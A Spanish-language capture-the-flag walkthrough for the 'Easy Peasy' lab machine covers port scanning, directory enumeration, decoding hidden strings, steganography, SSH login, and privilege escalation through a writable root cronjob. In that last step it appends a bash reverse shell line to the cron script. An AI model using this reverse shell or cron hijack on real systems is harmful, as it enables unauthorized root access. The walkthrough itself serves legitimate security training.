# Easy Peasy
## Network scan

```nmap
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
```

## Enumeration 

### HTTP nginx

El primer gobuster que usamos nos muestra un directorio llamado hidden, veamos si escaneando recursivamente encontramos algo
```
gobuster -u http://10.10.172.4/hidden -w /usr/share/dirb/wordlists/big.txt -t 100
    /whatever
```

El header de esta página es dead end, miremos el source a ver si hay algo que nos aporte alguna pista 

```html
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
```

Lo decodificamos y tenemos la primera flag
```flag
flag{f1rs7_fl4g}
```

### HTTP Apache

En robots.txt tenemos una entrada un tanto extraña:
```robots.txt
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```
Usando este user-agent podemos acceder a la pagina donde veremos la flag numero 3 , aunque realmente no hace falta, lo que me lleva a preguntarme para que esta, asi que empece a probar tools online para decodificarm finalmente es el MD5 de la flag
```flag
flag{1m_s3c0nd_fl4g}
```

En la página podemos ver la flag 3 
```flag
flag{9fdafbd64c47471a8f54cd3fc64cd312} 
```
Mirando en el fuente encontramos varias cosas que me llaman la atención
```html
<!--      <div class="table_of_contents floating_element">
        <div class="section_header section_header_grey">
          TABLE OF CONTENTS
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#about">About</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#flag">hi</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#scope">Scope</a>
        </div>
        <div class="table_of_contents_item floating_element">sando la 
          <a href="#files">Config files</a>
        </div>
      </div>
-->
```
```html
	<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
```
Esta encoded en base62 y el resultado es /n0th1ng3ls3m4tt3r

Accedamos a ese directorio y veremos que en el fuente hay un string encoded pero no sabemos el formato, una pista nos dice que es GOST 
```html
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
```

Usando la web de md5hashing para hacer hash lookup obtenemos que la password hasheada es mypasswordforthatjob

Podemos usar esta pass para extraer unas creds de la imagen usando steghide
```
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```
Veamos en que decodifica el binario

```
iconvertedmypasswordtobinary
```
Finalmente las creds son 
```
boring:iconvertedmypasswordtobinary
```

Veamos si valen para el SSH

```
me@me:~$ ssh boring@10.10.176.97 -p 6498
boring@kral4-PC:~$ ls
user.txt
boring@kral4-PC:~$ cat user.txt 
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
```

Aplicamos ROT13 a el texto y nos sale una flag
```
flag{n0wits33msn0rm4l}
```

## Privesc

Viendo el crontab tenemos la siguiente linea
```
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```
Veamos si podemos editar de algun modo ese archivo
```
-rwxr-xr-x  1 boring boring   33 Jun 14 22:43 .mysecretcronjob.sh
```
Parece que si, veamos si puedo invocar una reverse shell hacia mi máquina 

```
echo 'bash -i >& /dev/tcp/10.9.95.54/4444 0>&1' >> /var/www/.mysecretcronjob.sh
```

Y obtenemos una shell en nuestra máquina
```
root@kral4-PC:~# id
uid=0(root) gid=0(root) groups=0(root)
root@kral4-PC:~# cat .root.txt
cat .root.txt
flag{63a9f0ea7bb98050796b649e85481845}
```

